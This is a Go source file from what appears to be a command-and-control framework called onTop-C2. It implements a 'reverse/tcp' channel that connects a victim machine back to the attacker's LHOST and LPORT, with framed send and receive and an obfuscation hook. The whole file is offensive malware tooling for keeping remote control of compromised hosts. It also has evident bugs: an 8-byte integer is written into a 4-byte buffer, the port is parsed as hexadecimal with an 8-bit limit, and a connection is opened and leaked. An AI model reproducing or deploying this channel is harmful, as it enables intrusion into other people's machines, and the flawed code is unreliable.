// need to change from reverse_tcp for just tcp, reverse is part of spell logic
package rituals

import (
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"strconv"
	"time"

	// "github.com/Yyax13/onTop-C2/src/misc"
	"github.com/Yyax13/onTop-C2/src/fidelius"
	"github.com/Yyax13/onTop-C2/src/types"
)

var reverse_tcp types.Ritual = types.Ritual{
	Name: "reverse/tcp",
	Description: "Create a reverse TCP ritual from inferi (victim) to caster (attacker)",
	Fidelius: fidelius.Basic_bjump,
	Init: reverse_tcpInit{},

}

type reverse_tcpFloo struct{
	conn net.Conn

}

type reverse_tcpInit struct{
	lhost		string
	lport		int
	fidelius	types.FideliusCasting

}

func (r *reverse_tcpFloo) Send(data []byte) (error) {
	dataLen := uint64(len(data))
	dataLenBuf := make([]byte, 4)
	binary.BigEndian.PutUint64(dataLenBuf, dataLen)

	if _, err := r.conn.Write(dataLenBuf); err != nil {
		return fmt.Errorf("send: failed to send data len: %w", err)

	}

	if _, err := r.conn.Write(data); err != nil {
		return fmt.Errorf("send: failed to send data: %w", err)

	}

	return nil

}

func (r *reverse_tcpFloo) Receive() ([]byte, error) {
	dataLenBuf := make([]byte, 4)
	if _, err := io.ReadFull(r.conn, dataLenBuf); err != nil {
		return nil, fmt.Errorf("receive: failed to receive data len: %w", err)

	}
	
	lenBuf := binary.BigEndian.Uint64(dataLenBuf)
	data := make([]byte, lenBuf)

	if _, err := io.ReadFull(r.conn, data); err != nil {
		return nil, fmt.Errorf("receive: failed to receive data: %w", err)

	}

	return data, nil

}

func (r *reverse_tcpFloo) Close() (error) {
	return r.conn.Close()

}

func (r *reverse_tcpFloo) IsActive() (bool) {
	_ = r.conn.SetWriteDeadline(time.Now().Add(time.Millisecond * 900))
	_, err := r.conn.Write([]byte(nil))
	r.conn.SetWriteDeadline(time.Time{})
	return err == nil

}

func (t reverse_tcpInit) InitArcane() (*types.ArcaneLink, error) {
	host := t.lhost
	port := t.lport
	connString := net.JoinHostPort(host, strconv.Itoa(port))
	_, tryToReach := net.Dial("tcp", connString)
	if tryToReach != nil {
		return &types.ArcaneLink{}, fmt.Errorf("can't reach host %s, check it and try again", host)
	
	}
	
	connection, err := net.Dial("tcp", connString)
	if err != nil {
		return &types.ArcaneLink{}, err

	}

	return &types.ArcaneLink{
		Network: &reverse_tcpFloo{
			conn: connection, 
		
		},
		ClientScroll: &types.Scroll{},
		Fidelius: t.fidelius,
		
	}, nil

}

func reverse_tcpCreator() (RitualCreator) {
	return func(params map[string]string) (types.RitualInit, error) {
		port, err := strconv.ParseInt(params["LPORT"], 16, 8)
		if err != nil {
			return nil, fmt.Errorf("failed to use LPORT param as ritual lport: %w", err)

		}

		fideliusCast, exists := fidelius.AvaliableFidelius[params["FIDELIUS"]]
		if !exists {
			return nil, fmt.Errorf("specified fidelius %s do not exists", params["FIDELIUS"])

		}

		return reverse_tcpInit{
			lhost: params["LHOST"],
			lport: int(port),
			fidelius: fideliusCast.Fidelius,
			
		}, nil

	}

}

func init() {
	RegisterNewRitual(&reverse_tcp)
	RegisterNewRitualCreator("reverse/tcp", reverse_tcpCreator())

}
